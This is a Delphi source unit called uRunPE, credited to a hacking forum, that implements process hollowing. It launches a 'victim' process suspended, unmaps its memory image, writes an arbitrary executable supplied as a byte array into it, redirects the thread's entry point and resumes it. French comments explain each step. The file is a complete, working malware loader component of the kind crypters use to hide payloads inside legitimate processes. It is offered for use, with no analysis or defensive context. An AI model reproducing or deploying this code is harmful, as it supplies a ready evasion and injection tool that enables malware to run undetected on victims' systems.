{ uRunPE

  Author: Anonymous
  Description: Run Executables as Byte Arrays
  Original: http://www.freevbcode.com/ShowCode.asp?ID=8385
  Ported by: steve10120
  Website: http://hackhound.org
  History: First try
 
}

unit uRunPE;

interface

uses Windows;

type
  TByteArray = array of Byte;

function RunEXE(sVictim:string; bFile:TByteArray):Boolean;
function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';

implementation

procedure Move(Destination, Source: Pointer; dLength:Cardinal);
begin
  CopyMemory(Destination, Source, dLength);
end;

function RunEXE(sVictim:string; bFile:TByteArray):Boolean;
var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;
  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT:       TContext; // Contient des données du registre spécifique aux processus
  ImageBase:  Pointer;
  Ret:        DWORD;
  i:          integer;
  Addr:       DWORD;
  dOffset:    DWORD;
begin
  Result := FALSE;
  try
    Move(@IDH, @bFile[0], 64);
    if IDH.e_magic = IMAGE_DOS_SIGNATURE then // Si la signature est valide (MZ)
    begin
      Move(@INH, @bFile[IDH._lfanew], 248); // On lit l'entête PE
      if INH.Signature = IMAGE_NT_SIGNATURE then // Si la signature est valide (PE\0\0)
      begin
        (* Initialisation de TStartupInfo et TProcessInformation *)
        FillChar(SI, SizeOf(TStartupInfo),#0);
        FillChar(PI, SizeOf(TProcessInformation),#0);
        SI.cb := SizeOf(TStartupInfo);
        if CreateProcess(nil, PChar(sVictim), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then // On met en "pause" le processus
        begin
          CONT.ContextFlags := CONTEXT_FULL; // CONTEXT_FULL (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS)
          if GetThreadContext(PI.hThread, CONT) then // Retourne le context du thread courant
          begin
            ReadProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret); // Retourne dans Addr le contenu du processus
            NtUnmapViewOfSection(PI.hProcess, @Addr); // Map une section en mémoire
            ImageBase := VirtualAllocEx(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE); // Réserve l'espace nécessaire
            WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret); // Ecrit l'ImageBase dans le processus
            dOffset := IDH._lfanew + 248; // SizeOf(TImageNtHeaders) = 248
            for i := 0 to INH.FileHeader.NumberOfSections - 1 do // On liste toutes les sections
            begin
              Move(@ISH, @bFile[dOffset + (i * 40)], 40); // Une section fait 40 octets
              WriteProcessMemory(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret); // On inscrit la section dans le processus
              VirtualProtectEx(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, @Addr); // Autorisation d'écuter/lire/modifier la section
            end;
            WriteProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret); // Modifie le context
            CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint; // L'adresse ou l'on va charger le tout
            SetThreadContext(PI.hThread, CONT); // Modifie une derniére fois le context
            ResumeThread(PI.hThread); // On execute
            Result := TRUE;
          end;
        end;
      end;
    end;
  except
    CloseHandle(PI.hProcess);
    CloseHandle(PI.hThread);
  end;
end;

end.